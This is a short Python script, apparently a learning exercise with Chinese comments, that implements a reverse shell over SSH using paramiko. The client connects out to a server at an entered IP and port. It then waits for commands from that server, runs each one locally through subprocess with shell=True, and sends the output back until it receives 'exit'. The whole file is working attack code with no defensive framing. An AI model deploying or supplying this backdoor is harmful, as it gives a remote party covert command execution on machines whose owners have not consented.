import paramiko
import shlex
import subprocess

# 反向shell
def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)  # 客户端主动去连接服务器

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)  # 发送命令 ClientConnected
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)  # 读取服务器发送的命令
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)  # 执行命令
                ssh_session.send(cmd_output or 'okay')  # 发送命令输出给服务器
            except Exception as e:
                ssh_session.send(str(e))
    return

if __name__ == '__main__':
    import getpass
    user = input('Username:')
    password = getpass.getpass()
    ip = input('Enter server IP or <CR>: ') or '0.0.0.0'
    port = input('Enter port or <CR>: ') or '2222'
    # cmd = input('Enter command or <CR>: ') or 'id'
    ssh_command(ip, port, user, password, 'ClientConnected')